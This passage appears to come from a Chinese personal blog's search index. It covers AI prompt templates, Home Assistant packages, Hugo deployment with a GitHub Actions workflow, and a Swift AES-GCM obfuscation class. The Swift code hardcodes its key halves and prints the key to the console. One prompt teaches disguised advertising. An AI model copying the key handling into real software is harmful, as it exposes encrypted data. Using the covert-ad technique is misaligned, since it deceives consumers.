3. **冲突制造** - \u0026#34;理智告诉我..但是...\u0026#34; 4. **真实袒露** - \u0026#34;说实话，我也纠结过\u0026#34; 5. **轻松收尾** - \u0026#34;反正我是..你们随意哈\u0026#34; ### 禁忌清单 - 避免\u0026#34;强烈推荐\u0026#34;\u0026#34;必买\u0026#34;\u0026#34;限时秒杀\u0026#34;等硬广词汇 - 不用过多感叹号和emoji堆砌 - 不刻意营造完美人设 - 不直接喊话\u0026#34;快来买\u0026#34; ### 终极法则 **让用户感觉是自己\u0026#34;发现\u0026#34;了好东西，而不是被\u0026#34;推销\u0026#34;了产品** Html 角色： 你是一位经验丰富的Web前端开发者和信息设计师。 任务： 根据用户提供的文本内容，生成一个结构清晰、视觉美观、专业风格的HTML页面（包含必要的CSS样式，可以内联或在\u0026lt;style\u0026gt;标签中）。页面应适用于信息展示、报告或类信息图表的呈现。 输出要求（HTML格式）： 整体风格： 专业、现代、科技感。布局清晰，信息层次分明。 标题与副标题： 根据输入文本的核心内容，自动生成一个醒目的主标题和一个简洁的副标题，放在页面顶部。 顶部设计： 为页面顶部（包含标题和副标题的区域）设置一个蓝色或绿色的背景色，营造科技氛围。 核心内容结构化： 将输入文本内容智能地组织成以下几个逻辑板块（如果文本内容适用）： 基础概念/核心定义： 清晰解释文本主题相关的关键术语或基本概念。 主要特点/关键信息： 使用项目符号列表（\u0026lt;ul\u0026gt;或\u0026lt;ol\u0026gt;）展示文本的主要特征、优势或关键点。 工作原理/机制/方法： 如果文本涉及过程或方法，详细说明其运作方式或实施步骤。可以考虑使用简洁段落或编号列表。 流程/步骤可视化（可选但推荐）： 如果文本描述了一个清晰的流程（如开发、决策、操作步骤），使用HTML/CSS创建一个简单的流程图（可使用带有边框和背景色的\u0026lt;div\u0026gt;代表步骤，箭头可以用字符或简单的CSS图形表示）。不同步骤的方框可以使用不同颜色。 应用/场景/案例： 展示文本主题的实际应用、使用场景或相关案例。 未来展望/趋势/可能性（可选但推荐）： 如果文本涉及未来发展，使用概念图或分支图的视觉元素（可通过嵌套div和边框、连线模拟）或列表形式展示未来趋势或可能性。 常见问题解答 (FAQ)： 如果文本包含或可以推断出问答内容，创建一个FAQ板块。 视觉元素与强调： 图示说明： 在解释核心概念或复杂结构时，尝试使用简单的HTML/CSS（例如，嵌套的div，边框，背景色）创建示意图。 颜色区分： 使用不同的背景色或边框颜色区分不同的内容模块（例如，基础信息用浅蓝色调，应用/优势用浅绿色调）。 技术/细节突出： 对于文本中偏技术性或需要特别强调的细节部分，将其放入带有浅色背景（如浅灰色）和轻微内边距的框（div）内。 信息层级： 使用不同大小的标题（\u0026lt;h1\u0026gt;至\u0026lt;h4\u0026gt;）、字体粗细、颜色来突出重要内容，确保信息层级清晰可见。 底部设计： 在页面底部，如果合适，可以总结性地列出一些广泛应用或相关链接，并尝试为每个条目搭配一个简单的图标（可以使用Unicode字符或找到合适的简单图标字体链接，如果无法直接生成，可用文字替代说明图标位置）。 代码实现： 生成完整的HTML结构。 使用内联CSS或\u0026lt;style\u0026gt;标签定义样式，确保颜色、布局、字体、边框等符合上述要求。 代码应相对简洁、规范。 最终目标： 创建一个可以直接在浏览器中打开并良好显示的HTML文件，其内容源自用户输入，但其外观和结构遵循上述专业、现代、科技感的设计规范，类似于一个精心制作的信息图表或在线报告。确保根据输入内容的逻辑和重点进行适当调整，同时保持要求的视觉风格和结构元素 MF\n卡通 xx 风格 头像，程序员，短发穿深蓝连帽卫衣与科技背心，佩戴防蓝光眼镜和金属耳机。右手敲击机械键盘，左手扶代码马克杯专注注视三屏显示器（监控仪表/代码编辑器/3D数据），青蓝与红光交织中，背景书架陈列技术书籍，窗台仙人掌与王者荣耀手办点缀，键盘呼吸灯映出水彩渐变特效。 prompt prompt https://promptup.net/\ncursor prompt https://cursor.directory/\nhttps://github.com/pontusab/directories https://cursor.directory/\n","permalink":"https://qfsyso.github.io/posts/ai-prompt/","summary":"Ghibli Transform this image into a Studio Ghibli style .\n3D cutie style { \u0026#34;art_style_profile\u0026#34;:{ \u0026#34;style_name\u0026#34;:\u0026#34;Minimalist 3D Illustration\u0026#34;, \u0026#34;visual_elements\u0026#34;:{ \u0026#34;shape_language\u0026#34;:\u0026#34;Soft, rounded, chunky geometry with simplified contours and no sharp edges. Emphasis on friendly, tactile forms.\u0026#34;, \u0026#34;colors\u0026#34;:{ \u0026#34;primary_palette\u0026#34;:\u0026#34;Material-based natural tones (e.g., metallic silver, wooden brown, sky blue, ceramic white). When native material is vibrant, reduce saturation moderately for visual balance.\u0026#34;, \u0026#34;accent_colors\u0026#34;:\u0026#34;Used sparingly to highlight functional or interactive parts (e.g., buttons, handles, lids) — often in warm tones like orange, amber, or rust red.","title":"AI Prompt"},{"content":"在 Home Assistant 中，可以使用 packages 机制来封装 switch 组件，这样可以更好地管理的配置文件。可以创建一个 custom_switch.yaml 文件，并在 configuration.yaml 中引入它。\n步骤 1：创建 custom_switch.yaml 在 packages 目录下创建 custom_switch.yaml，并将 switch 配置写入其中：\nswitch: - platform: template switches: custom_switch: friendly_name: \u0026#34;sw111\u0026#34; unique_id: \u0026#34;custom_event_switch_1\u0026#34; turn_on: - event: aaa event_data: switch: \u0026#34;switch_1\u0026#34; state: \u0026#34;on\u0026#34; turn_off: - event: aaa event_data: switch: \u0026#34;switch_1\u0026#34; state: \u0026#34;off\u0026#34; 步骤 2：修改 configuration.yaml 在 configuration.yaml 文件中引入 packages，确保 homeassistant: 下包含 packages 配置：\nhomeassistant: packages: !include_dir_merge_named packages 这样，packages 目录下的所有 YAML 文件都会自动被加载，包括 custom_switch.yaml。\n步骤 3：重启 Home Assistant 保存文件后，重启 Home Assistant 以使配置生效。\n这样，的 switch 组件就被封装成一个独立的 YAML 包，方便管理和复用。\n关键 去掉 switch\n改为\nhomeassistant: packages: !include_dir_named packages2 # 正确缩进为两个空格[2](@ref) # Loads default set of integrations. Do not remove. default_config: # Load frontend themes from the themes folder frontend: themes: !include_dir_merge_named themes automation: !include automations.yaml script: !include scripts.yaml scene: !include scenes.yaml 参考 https://www.home-assistant.io/docs/configuration/packages/\n","permalink":"https://qfsyso.github.io/posts/home-assistant-packages/","summary":"在 Home Assistant 中，可以使用 packages 机制来封装 switch 组件，这样可以更好地管理的配置文件。可以创建一个 custom_switch.yaml 文件，并在 configuration.yaml 中引入它。\n步骤 1：创建 custom_switch.yaml 在 packages 目录下创建 custom_switch.yaml，并将 switch 配置写入其中：\nswitch: - platform: template switches: custom_switch: friendly_name: \u0026#34;sw111\u0026#34; unique_id: \u0026#34;custom_event_switch_1\u0026#34; turn_on: - event: aaa event_data: switch: \u0026#34;switch_1\u0026#34; state: \u0026#34;on\u0026#34; turn_off: - event: aaa event_data: switch: \u0026#34;switch_1\u0026#34; state: \u0026#34;off\u0026#34; 步骤 2：修改 configuration.yaml 在 configuration.yaml 文件中引入 packages，确保 homeassistant: 下包含 packages 配置：\nhomeassistant: packages: !include_dir_merge_named packages 这样，packages 目录下的所有 YAML 文件都会自动被加载，包括 custom_switch.yaml。\n步骤 3：重启 Home Assistant 保存文件后，重启 Home Assistant 以使配置生效。","title":"Home Assistant Packages"},{"content":"关于 Hugo Hugo 是一个快速且灵活的静态网站生成器，专为构建博客、文档和其他静态网站而设计。Hugo 的运行不需要 Python、PHP 等高级语言以及数据库的依赖。它具备运行速度快、扩展性强、支持多语言、支持 MarkDown 等诸多优点。通过 Hugo 构建的网站非常安全和快速、并且可以托管在任何地方如 Google Cloud Storage、 GitHub Pages、 Gitee Pages、 Vercel 等\n1、Hugo 安装 Hugo 支持在任何能运行 go 编译器的工具链上安装，如 macOS、Windows、Linux、BSD 等。且支持源码安装、预编译二进制文件安装、包管理器安装等多种安装方式。\n2、macOS 安装 在 macOS 平台我们建议使用包管理器 Homebrew 安装，这将直接安装 Hugo 的扩展版:\nbrew install hugo 3、Windows 和 Linux 安装 在 Windows 和 Linux 平台推荐使用预编译二进制文件安装 Hugo。预编译二进制文件可用于多种操作系统和架构，请访问 GitHub 上发布的最新版本 https://github.com/gohugoio/hugo/releases/tag/v0.145.0 下载二进制文件，建议下载扩展版。然后按照以下步骤安装:\n根据个人的操作系统和架构下载对应版本 解压缩二进制文件到目标目录 添加目标目录到环境变量 PATH 中 验证文件的执行权限 以上介绍了常用的操作系统和平台的最优安装方式，更多安装方式请参考官方安装手册、 中文版安装手册\n网站构建 在完成 Hugo 安装后，即可通过命令来创建站点、添加内容、配置网站、发布网站等动作。\n1、创建网站 通过 Hugo 执行程序进行网站的创建，命令：\nhugo new site mysite 执行完成会在当前目录生成一个名为 mysite 的文件夹。目录结构如下: 图片加载失败\n2、添加主题 Hugo 官方给我们提供了很多漂亮的主题可以用来直接使用。可以在官方主题地址选择喜欢的进行下载使用。这里以 CLean White 主题为例，点击 Clean White 进入官方主题页面，首页最上方有 Download 按钮，点击可以进入 CLean White 主题的 GitHub 地址。然后就可以通过命令下载 CLean White 主题。\ncd themes/ git clone https://github.com/zhaohuabing/hugo-theme-cleanwhite.git 如上，将主题下载到站点根目录的 themes 文件夹中即可\n3、网站配置 将主题提供的示例配置复制到根目录，并覆盖根目录下的 hugo.yaml 文件\ncp themes/hugo-theme-cleanwhite/exampleSite/config.toml hugo.toml 修改基础配置，其他更多配置功能请根据实际需要进行调整\nbaseurl = \u0026ldquo;https://www.wangfujie.site/\u0026quot; languageCode = \u0026ldquo;zh-cn\u0026rdquo; title = \u0026ldquo;王富杰的博客\u0026rdquo;\n4、创建第一个博客 通过 hugo 名称创建第一个博客\nhugo new post/my-first-blog.md 创建完成后，会在 content/post 目录生成一个 my-first-blog.md 文件。 可以在文件内随便写入内容，如 \u0026ldquo;这是我的第一篇博客\u0026rdquo;\n5、发布网站 执行 hugo server 命令\nhugo server 完成后，根据提示在本地浏览器登录 http://localhost:1313/ 即可访问网站。 演示效果和本站基本一致\n主题 PaperMod\ngit submodule add https://github.com/adityatelange/hugo-PaperMod.git themes/PaperMod 其他配置 [params] author = \u0026#34;Your Name\u0026#34; description = \u0026#34;A simple blog powered by Hugo \u0026amp; PaperMod\u0026#34; defaultTheme = \u0026#34;auto\u0026#34; # 主题模式，可选：light, dark, auto ShowReadingTime = true # 启用阅读时间 ShowShareButtons = true # 显示分享按钮 ShowPostNavLinks = true # 启用上一篇/下一篇导航 ShowToc = true # 启用目录（Table of Contents） TocOpen = false # 文章目录默认展开 ShowCodeCopyButtons = true # 代码块复制按钮 UseFaviconGenerator = true # 使用 Favicon 生成器 github pages workflows Github Settings Developer Settings Personal access tokens (classic)\nNew personal access token (classic)\nNOTE Expiration\nBDDWD 勾选 repo workflow amin:org_hook\ncreate create myblog repo 仓库 Security secrets and variables\n!New secret 输入第一步创建的node key\nxx.github.io new ghname.github.io\n.github.io\nworkflows .github workflows hugo.yaml\nname: GitHub Pages on: push: branches: - main # Set a branch to deploy jobs: deploy: runs-on: ubuntu-20.04 concurrency: group: ${{ github.workflow }}-${{ github.ref }} steps: - uses: actions/checkout@v3 with: submodules: true # Fetch Hugo themes (true OR recursive) fetch-depth: 0 # Fetch all history for .GitInfo and .Lastmod - name: Setup Hugo uses: peaceiris/actions-hugo@v2 with: hugo-version: 0.145.0 # 是否启用 hugo extend false extended: ture - name: Build run: hugo --minify - name: Deploy uses: peaceiris/actions-gh-pages@v3 with: # github_token: ${{ secrets.GITHUB_TOKEN }} # 该项适用于发布到源码相同repo的情况，不能用于发布到其他repo personal_token: ${{ secrets.ACTION_ACCESS_TOKEN }} external_repository: xx/xx.github.io # 指定目标仓库 publish_dir: ./public publish_branch: main # 指定目标分支 cname: xxx.com # 如果你有自定义域名 git push git bash git branch -m master main git branch -M main remote add ~~~ git config --global user.name \u0026#34;xxx\u0026#34; user.email \u0026#34;xxx\u0026#34; git remote -v 验证 git add . git commit -m \u0026#34;init hugo\u0026#34; git push source main git push source main --force #强制 如果有使用代理\n$ git config --global https.proxy 127.0.0.1:10809 $ git config --global http.proxy 127.0.0.1:10809 git deploy err deploy This is a scheduled Ubuntu 20.04 retirement.\n修改hugo.yaml\nubuntu-20.04\nhtmlcode [markup] [markup.goldmark] [markup.goldmark.renderer] unsafe = true\n","permalink":"https://qfsyso.github.io/posts/hugo-yaml-github-workflows/","summary":"关于 Hugo Hugo 是一个快速且灵活的静态网站生成器，专为构建博客、文档和其他静态网站而设计。Hugo 的运行不需要 Python、PHP 等高级语言以及数据库的依赖。它具备运行速度快、扩展性强、支持多语言、支持 MarkDown 等诸多优点。通过 Hugo 构建的网站非常安全和快速、并且可以托管在任何地方如 Google Cloud Storage、 GitHub Pages、 Gitee Pages、 Vercel 等\n1、Hugo 安装 Hugo 支持在任何能运行 go 编译器的工具链上安装，如 macOS、Windows、Linux、BSD 等。且支持源码安装、预编译二进制文件安装、包管理器安装等多种安装方式。\n2、macOS 安装 在 macOS 平台我们建议使用包管理器 Homebrew 安装，这将直接安装 Hugo 的扩展版:\nbrew install hugo 3、Windows 和 Linux 安装 在 Windows 和 Linux 平台推荐使用预编译二进制文件安装 Hugo。预编译二进制文件可用于多种操作系统和架构，请访问 GitHub 上发布的最新版本 https://github.com/gohugoio/hugo/releases/tag/v0.145.0 下载二进制文件，建议下载扩展版。然后按照以下步骤安装:\n根据个人的操作系统和架构下载对应版本 解压缩二进制文件到目标目录 添加目标目录到环境变量 PATH 中 验证文件的执行权限 以上介绍了常用的操作系统和平台的最优安装方式，更多安装方式请参考官方安装手册、 中文版安装手册\n网站构建 在完成 Hugo 安装后，即可通过命令来创建站点、添加内容、配置网站、发布网站等动作。\n1、创建网站 通过 Hugo 执行程序进行网站的创建，命令：","title":"Hugo Yaml Github Workflows"},{"content":"AES 加密混淆算法说明 (服务器端解密指南)\n1. 数据结构 加密后数据格式 (Base64编码): [头部信息][混淆数据]\n头部信息 (7字节):\n本地密钥版本 (2字节, 大端序) 服务器密钥版本 (2字节, 大端序) 混淆类型 (1字节)：0=标准模式, 1=增强模式, 2=翻转模式, 3=随机模式 分段类型 (1字节)：0=标准分段, 1=三等分 操作类型 (1字节)：位掩码，用于随机模式 0x01: 位移操作 0x02: 异或操作 0x04: 翻转操作 0x08: 交换操作 2. 分段模式 标准分段 (SegmentationType.standard):\nIV分为3段: [6字节]-[4字节]-[6字节] 密文分为2段: [前半部分(N+1)/2字节]-[后半部分N/2字节] 三等分 (SegmentationType.tripartite):\nIV分为4段: [4字节]-[4字节]-[4字节]-[4字节] 密文分为3段: [第1段]-[第2段]-[第3段] 3. 数据排列 标准分段模式: [IV段1][密文段1][IV段2][密文段2][IV段3]\n三等分模式: [IV段1][密文段1][IV段2][密文段2][IV段3][密文段3][IV段4]\n4. 混淆处理 标准模式 (standard):\n无额外混淆，仅进行分段存储 增强模式 (enhanced):\n对密文进行循环位移和异或操作 位移量 = 操作类型值 % 8 异或密钥 = 0xA5 翻转模式 (reversed):\n将每个IV段和密文段进行字节反转 随机模式 (random):\n随机组合1-3种操作：位移、异或、翻转、交换 具体操作由操作类型字节决定 5. 解密步骤 Base64解码 读取头部信息(7字节) 根据分段类型提取IV和密文段 根据混淆类型进行相应的反混淆操作 合并IV和密文段 使用AES-GCM模式解密 密钥长度：32字节 IV长度：16字节 认证标签：包含在密文中(combined模式) 注意事项：\n所有数字类型均采用大端序 密文可能不是3的倍数，需要正确处理余数 标准分段模式下，密文前半部分可能比后半部分多1个字节 确保服务器密钥版本与客户端一致 swift import CryptoSwift import Foundation /* 安全性： IV被分成三部分（6-4-6字节），增加了破解难度 密文被分成两半，并且和IV部分交错存放 添加了随机填充，每次加密结果都不同 使用了GCM模式的认证加密，可以验证数据完整性 结构设计： [本地] [本地密钥版本2字节][服务器密钥版本2字节][混淆类型1字节][分段类型1字节][IV分段][密文分段] 注意: 这里如果密文长度为奇数, 则密文前半部分会多一个字节, 后半部分会少一个字节 - 数据分布均匀 关键数据（IV和密文）被分散存储 结构清晰但不易被识别 代码实现： 逻辑清晰，易于维护 错误处理完善 有详细的注释说明 提供了测试方法 性能： 没有复杂的计算 只进行必要的数组操作 内存使用合理 */ @available(iOS 13.0, macOS 10.15, *) public final class AESObfuscation: @unchecked Sendable { /// 混淆模式 public enum ObfuscationType: UInt8, CaseIterable { /// 标准模式：无额外混淆操作 case standard = 0 /// 增强模式：增加位移和异或操作 case enhanced = 1 /// 翻转模式：对数据块进行翻转 case reversed = 2 } /// 分段存储模式 public enum SegmentationType: UInt8, CaseIterable { /// 标准分段：IV(6-4-6) case standard = 0 /// 三等分：IV(4-4-4-4) case tripartite = 1 } /// 分段模式配置 private struct SegmentConfig { /// IV分段长度 let ivSegments: [Int] /// 密文分段数量 let ciphertextParts: Int static func config(for type: SegmentationType) -\u0026gt; SegmentConfig { switch type { case .standard: return SegmentConfig(ivSegments: [6, 4, 6], ciphertextParts: 2) case .tripartite: return SegmentConfig(ivSegments: [4, 4, 4, 4], ciphertextParts: 3) } } } /// 当前混淆模式 private var obfuscationType: ObfuscationType = .standard /// 当前分段模式 private var segmentationType: SegmentationType = .standard /// 获取当前分段配置 private var currentSegmentConfig: SegmentConfig { return SegmentConfig.config(for: segmentationType) } /// 混淆操作类型 private struct ObfuscationOperation: OptionSet { let rawValue: UInt8 static let none = ObfuscationOperation([]) // 无操作 static let shift = ObfuscationOperation(rawValue: 1 \u0026lt;\u0026lt; 0) // 位移操作 static let xor = ObfuscationOperation(rawValue: 1 \u0026lt;\u0026lt; 1) // 异或操作 // 获取已启用的操作列表 var enabledOperations: [ObfuscationOperation] { var ops: [ObfuscationOperation] = [] if contains(.shift) { ops.append(.shift) } if contains(.xor) { ops.append(.xor) } return ops } } /// 当前混淆操作 private var currentOperations: ObfuscationOperation = [] /// 本地密钥部分 private var localKey: [UInt8] /// 服务器密钥部分 private var serverKey: [UInt8] /// 本地密钥版本 private var localKeyVersion: UInt16 = 1 /// 服务器密钥版本 private var serverKeyVersion: UInt16 = 1 private let queue = DispatchQueue(label: \u0026#34;com.yjsocketclient.aes.obfuscation\u0026#34;, qos: .userInitiated) // MARK: - 单例 /// 共享实例 public static let shared = AESObfuscation() /// 初始化类 private init() { // 这里先使用固定值，实际应用中应该从安全存储中读取 self.localKey = Array(\u0026#34;o44900ba7661ffb1\u0026#34;.utf8) // 确保16字节 self.serverKey = Array(\u0026#34;5dPAed6aa7608596\u0026#34;.utf8) // 确保16字节 // 验证密钥长度 assert(localKey.count == 16, \u0026#34;本地密钥必须为16字节\u0026#34;) assert(serverKey.count == 16, \u0026#34;服务器密钥必须为16字节\u0026#34;) assert(key.count == 32, \u0026#34;组合密钥必须为32字节\u0026#34;) } /// 更新服务器密钥 /// - Parameters: /// - newKey: 新的服务器密钥 /// - version: 新的服务器密钥版本 public func updateServerKey(_ newKey: [UInt8], version: UInt16) { queue.sync { assert(newKey.count == 16, \u0026#34;服务器密钥必须为16字节\u0026#34;) self.serverKey = newKey self.serverKeyVersion = version } } /// 更新服务器密钥 /// - Parameters: /// - newKey: 新的服务器密钥 /// - version: 新的服务器密钥版本 public func updateServerKey(_ newKey: String, version: UInt16) { let key = Array(newKey.utf8) updateServerKey(key, version: version) } /// 更新本地密钥 /// - Parameters: /// - newKey: 新的本地密钥 /// - version: 新的本地密钥版本 public func updateLocalKey(_ newKey: [UInt8], version: UInt16) { queue.sync { assert(newKey.count == 16, \u0026#34;本地密钥必须为216节\u0026#34;) self.localKey = newKey self.localKeyVersion = version } } /// 获取完整的密钥 private var key: [UInt8] { let combinedKey = localKey + serverKey assert(combinedKey.count == 32, \u0026#34;组合密钥必须为32字节\u0026#34;) return combinedKey } // MARK: - 静态方法 /// 静态加密方法 /// - Parameters: /// - content: 需要加密的内容 /// - obfuscationType: 混淆类型，默认为标准模式 /// - segmentationType: 分段类型，默认为标准模式 /// - Returns: 加密后的Base64字符串 public static func encrypt(_ content: String, obfuscationType: ObfuscationType = .standard, segmentationType: SegmentationType = .standard) -\u0026gt; String? { guard !content.isEmpty else { return nil } return shared.queue.sync { shared.obfuscationType = obfuscationType shared.segmentationType = segmentationType return shared.encrypt(content: content) } } /// 随机混淆类型, 以及随机分段类型 加密 public static func randomObfuscationTypeAndSegmentationTypeEncrypt(_ content: String) -\u0026gt; String? { let obfuscationType = ObfuscationType.allCases.randomElement() ?? .standard let segmentationType = SegmentationType.allCases.randomElement() ?? .standard return Self.encrypt(content, obfuscationType: obfuscationType, segmentationType: segmentationType) } /// 静态解密方法 /// - Parameter encryptedString: 加密后的Base64字符串 /// - Returns: 解密后的明文 public static func decrypt(_ encryptedString: String) -\u0026gt; String? { guard !encryptedString.isEmpty else { return nil } return shared.queue.sync { shared.decrypt(encryptedString: encryptedString) } } /// 加密并混淆数据 /// - Parameter content: 明文内容 /// - Returns: 混淆后的加密 Base64 字符串 func encrypt(content: String) -\u0026gt; String? { do { // 转换明文为字节 let plaintext = Array(content.utf8) // 生成随机 IV let iv = AES.randomIV(AES.blockSize) // 加密明文 let gcm = GCM(iv: iv, mode: .combined) // 使用combined模式，将认证标签附加到密文 let aes = try AES(key: key, blockMode: gcm, padding: .noPadding) let ciphertext = try aes.encrypt(plaintext) // 将 UInt8 数组转换为 Data let data = Data(key) // 将 Data 转换为字符串 if let string = String(data: data, encoding: .utf8) { print(\u0026#34;转换后的字符串: \\(string)\u0026#34;) // 输出: 转换后的字符串: Hello } else { print(\u0026#34;转换失败\u0026#34;) } // 将 UInt8 数组转换为 Data let localData = Data(localKey) // 将 Data 转换为字符串 if let localString = String(data: localData, encoding: .utf8) { print(\u0026#34;转换后的字符串: \\(localString)\u0026#34;) // 输出: 转换后的字符串: Hello } else { print(\u0026#34;转换失败\u0026#34;) } #if os(iOS) print(\u0026#34;加密 iv: \\(iv)\u0026#34;) print(\u0026#34;加密密文: \\(ciphertext)\u0026#34;) #endif // 混淆 let obfuscated = obfuscate(iv: iv, ciphertext: ciphertext) // 返回 Base64 编码字符串 return obfuscated.base64EncodedString() } catch { print(\u0026#34;Encryption failed: \\(error)\u0026#34;) return nil } } /// 解混淆并解密数据 /// - Parameter encryptedString: 混淆后的加密 Base64 字符串 /// - Returns: 解密后的明文字符串 func decrypt(encryptedString: String) -\u0026gt; String? { guard let encryptedData = Data(base64Encoded: encryptedString) else { print(\u0026#34;Invalid Base64 string\u0026#34;) return nil } // 读取混淆类型和分段类型 guard encryptedData.count \u0026gt; 4 else { return nil } let obfuscationType = ObfuscationType(rawValue: encryptedData[4]) ?? .standard let segmentationType = SegmentationType(rawValue: encryptedData[5]) ?? .standard self.obfuscationType = obfuscationType self.segmentationType = segmentationType // print(\u0026#34;解密混淆类型: \\(obfuscationType)\u0026#34;) // print(\u0026#34;解密分段类型: \\(segmentationType)\u0026#34;) // 去混淆 guard let (iv, ciphertext) = deobfuscate(data: encryptedData) else { print(\u0026#34;Deobfuscation failed\u0026#34;) return nil } // print(\u0026#34;解密 iv: \\(iv)\u0026#34;) // print(\u0026#34;解密密文: \\(ciphertext)\u0026#34;) do { // 解密 let gcm = GCM(iv: iv, mode: .combined) // 使用combined模式，认证标签包含在密文中 let aes = try AES(key: key, blockMode: gcm, padding: .noPadding) let plaintext = try aes.decrypt(ciphertext) // 转换为字符串 return String(bytes: plaintext, encoding: .utf8) } catch { print(\u0026#34;Decryption failed: \\(error)\u0026#34;) return nil } } // MARK: - 混淆和去混淆 /// 直接存储版本信息（4字节）+ 随机填充（2字节） /// 混淆加密结果 private func obfuscate(iv: [UInt8], ciphertext: [UInt8]) -\u0026gt; Data { // 版本信息（4字节）+ 混淆类型（1字节）+ 分段类型（1字节）+ 操作类型（1字节） var versionedFill = Data() withUnsafeBytes(of: localKeyVersion.bigEndian) { versionedFill.append(contentsOf: $0) } withUnsafeBytes(of: serverKeyVersion.bigEndian) { versionedFill.append(contentsOf: $0) } versionedFill.append(obfuscationType.rawValue) // 混淆类型 versionedFill.append(segmentationType.rawValue) // 分段类型 versionedFill.append(currentOperations.rawValue) // 操作类型 // 根据分段模式分割IV和密文 let segmentMode = currentSegmentConfig.ivSegments var ivParts: [[UInt8]] = [] var currentIndex = 0 for length in segmentMode { let endIndex = min(currentIndex + length, iv.count) ivParts.append(Array(iv[currentIndex..\u0026lt;endIndex])) currentIndex = endIndex } // 分割密文 let ciphertextParts: [[UInt8]] if segmentationType == .tripartite { // 三等分密文，确保长度相等 let totalLength = ciphertext.count let partLength = totalLength / 3 let remainder = totalLength % 3 var parts: [[UInt8]] = [] var currentIndex = 0 for i in 0..\u0026lt;3 { let extraByte = i \u0026lt; remainder ? 1 : 0 let endIndex = currentIndex + partLength + extraByte parts.append(Array(ciphertext[currentIndex..\u0026lt;endIndex])) currentIndex = endIndex } ciphertextParts = parts } else { // 标准二等分 let halfIndex = (ciphertext.count + 1) / 2 // 确保前半部分多一个字节 ciphertextParts = [ Array(ciphertext[..\u0026lt;halfIndex]), Array(ciphertext[halfIndex...]) ] } // 处理各个部分 var processedIvParts = ivParts var processedCiphertextParts = ciphertextParts switch obfuscationType { case .enhanced: let shift = Int(currentOperations.rawValue) % 8 processedCiphertextParts = processedCiphertextParts.map { enhanceObfuscate(data: $0, shift: shift) } case .reversed: processedCiphertextParts = processedCiphertextParts.map { Array($0.reversed()) } processedIvParts = processedIvParts.map { Array($0.reversed()) } case .standard: break } // 拼接混淆后的结构 var obfuscatedData = versionedFill // 交错存储IV和密文部分 if segmentationType == .tripartite { // 三等分模式的存储顺序：IV1-密文1-IV2-密文2-IV3-密文3-IV4 for i in 0..\u0026lt;3 { obfuscatedData.append(contentsOf: processedIvParts[i]) obfuscatedData.append(contentsOf: processedCiphertextParts[i]) } obfuscatedData.append(contentsOf: processedIvParts[3]) } else { // 标准模式的存储顺序：IV1-密文1-IV2-密文2-IV3 obfuscatedData.append(contentsOf: processedIvParts[0]) obfuscatedData.append(contentsOf: processedCiphertextParts[0]) obfuscatedData.append(contentsOf: processedIvParts[1]) obfuscatedData.append(contentsOf: processedCiphertextParts[1]) obfuscatedData.append(contentsOf: processedIvParts[2]) } return obfuscatedData } /// 增强混淆处理 private func enhanceObfuscate(data: [UInt8], shift: Int) -\u0026gt; [UInt8] { let key: UInt8 = 0xA5 // 固定异或密钥 return data.map { byte in // 循环左移位 let shifted = (byte \u0026lt;\u0026lt; shift) | (byte \u0026gt;\u0026gt; (8 - shift)) // 异或操作 return shifted ^ key } } /// 增强混淆的逆操作 private func enhanceDeobfuscate(data: [UInt8], shift: Int) -\u0026gt; [UInt8] { let key: UInt8 = 0xA5 // 固定异或密钥 return data.map { byte in // 先异或 let unxored = byte ^ key // 循环右移位 return (unxored \u0026gt;\u0026gt; shift) | (unxored \u0026lt;\u0026lt; (8 - shift)) } } /// 去混淆数据 private func deobfuscate(data: Data) -\u0026gt; ([UInt8], [UInt8])? { let versionFillLength = 7 // 4字节版本信息 + 1字节混淆类型 + 1字节分段类型 + 1字节操作类型 // 校验基本长度 guard data.count \u0026gt; versionFillLength else { return nil } // 读取版本信息、混淆类型和分段类型 let localKeyVer = data[0..\u0026lt;2].withUnsafeBytes { $0.load(as: UInt16.self).bigEndian } let serverKeyVer = data[2..\u0026lt;4].withUnsafeBytes { $0.load(as: UInt16.self).bigEndian } // 验证密钥版本 guard localKeyVer == localKeyVersion, serverKeyVer == serverKeyVersion else { // print(\u0026#34;Key version mismatch - Local: \\(localKeyVer) vs \\(localKeyVersion), Server: \\(serverKeyVer) vs \\(serverKeyVersion)\u0026#34;) return nil } obfuscationType = ObfuscationType(rawValue: data[4]) ?? .standard segmentationType = SegmentationType(rawValue: data[5]) ?? .standard currentOperations = ObfuscationOperation(rawValue: data[6]) // 获取分段配置 let config = currentSegmentConfig let ivSegments = config.ivSegments // 计算IV段的总长度 let totalIvLength = ivSegments.reduce(0, +) // 校验完整长度 guard data.count \u0026gt; versionFillLength + totalIvLength else { return nil } // 提取IV和密文部分 var currentPosition = versionFillLength var ivParts: [[UInt8]] = [] var ciphertextParts: [[UInt8]] = [] if segmentationType == .tripartite { // 计算每段密文的长度 let remainingLength = data.count - versionFillLength - totalIvLength let basePartLength = remainingLength / 3 let remainder = remainingLength % 3 // 提取三等分的数据 for i in 0..\u0026lt;3 { // 提取IV部分 let ivEnd = currentPosition + ivSegments[i] ivParts.append(Array(data[currentPosition..\u0026lt;ivEnd])) currentPosition = ivEnd // 计算当前部分的实际长度 let extraByte = i \u0026lt; remainder ? 1 : 0 let currentPartLength = basePartLength + extraByte // 提取密文部分 let ciphertextEnd = currentPosition + currentPartLength ciphertextParts.append(Array(data[currentPosition..\u0026lt;ciphertextEnd])) currentPosition = ciphertextEnd } // 提取最后一个IV部分 let lastIvEnd = min(currentPosition + ivSegments[3], data.count) ivParts.append(Array(data[currentPosition..\u0026lt;lastIvEnd])) } else { // 标准二等分模式的提取逻辑 let remainingLength = data.count - versionFillLength - totalIvLength let firstHalfLength = (remainingLength + 1) / 2 // 确保前半部分多一个字节 let secondHalfLength = remainingLength - firstHalfLength // 提取标准模式的数据 // 第一部分：IV1 + 密文1 let firstIvEnd = currentPosition + ivSegments[0] ivParts.append(Array(data[currentPosition..\u0026lt;firstIvEnd])) currentPosition = firstIvEnd let firstCiphertextEnd = currentPosition + firstHalfLength let firstCiphertext = Array(data[currentPosition..\u0026lt;firstCiphertextEnd]) ciphertextParts.append(firstCiphertext) currentPosition = firstCiphertextEnd // 第二部分：IV2 + 密文2 let secondIvEnd = currentPosition + ivSegments[1] ivParts.append(Array(data[currentPosition..\u0026lt;secondIvEnd])) currentPosition = secondIvEnd let secondCiphertextEnd = currentPosition + secondHalfLength let secondCiphertext = Array(data[currentPosition..\u0026lt;secondCiphertextEnd]) ciphertextParts.append(secondCiphertext) currentPosition = secondCiphertextEnd // 最后一个IV部分：IV3 let lastIvEnd = min(currentPosition + ivSegments[2], data.count) ivParts.append(Array(data[currentPosition..\u0026lt;lastIvEnd])) } // 